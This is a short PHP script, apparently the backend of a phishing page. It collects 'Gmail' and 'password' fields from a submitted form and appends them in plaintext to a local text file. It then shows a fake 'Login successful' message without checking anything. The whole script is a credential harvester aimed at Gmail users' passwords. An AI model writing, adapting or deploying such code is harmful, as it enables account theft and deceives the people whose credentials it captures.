<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $Gmail = $_POST["Gmail"];
    $password = $_POST["password"];
    $data = "Gmail: " . $Gmail . "\nPassword: " . $password . "\n\n";

    $file = fopen("user_data.txt", "a");

    fwrite($file, $data);

    fclose($file);

    echo "Login successful! Data saved.";
}
?>
